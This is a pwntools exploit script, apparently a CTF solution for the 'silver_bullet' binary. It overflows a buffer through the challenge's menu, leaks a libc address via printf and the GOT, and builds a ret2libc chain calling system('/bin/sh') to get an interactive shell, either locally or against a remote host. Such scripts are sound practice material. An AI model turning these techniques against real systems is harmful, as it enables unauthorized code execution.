#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('silver_bullet_patched')
libc = ELF("./libc.so.6")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+197
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def create(data):
    io.sendlineafter(b":", b"1")
    io.sendafter(b":", data)

def power(data):
    io.sendlineafter(b":", b"2")
    io.sendafter(b":", data)

def beat():
    io.sendlineafter(b":", b"3")


def solve():

    offset = 4
    payload = flat({
        offset: [
            exe.plt["printf"],
            exe.sym["main"],
            exe.got["printf"]
        ]
    })

    create(b"A" * 47)
    power(b"B")
    power(b"\x99" * 3 + payload)
    beat()

    io.recvuntil(b"win !!\n")
    usleep = u32(io.recv(8)[4:])
    libc.address = usleep - libc.sym["usleep"]
    info("libc base: %#x", libc.address)
    
    offset = 4
    sh = next(libc.search(b"/bin/sh\x00"))
    system = libc.sym["system"]

    payload = flat({
        offset: [
            system,
            b"B"*4,
            sh
        ]
    })

    create(b"A" * 47)
    power(b"B")
    power(b"\x99" * 3 + payload)
    beat()

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

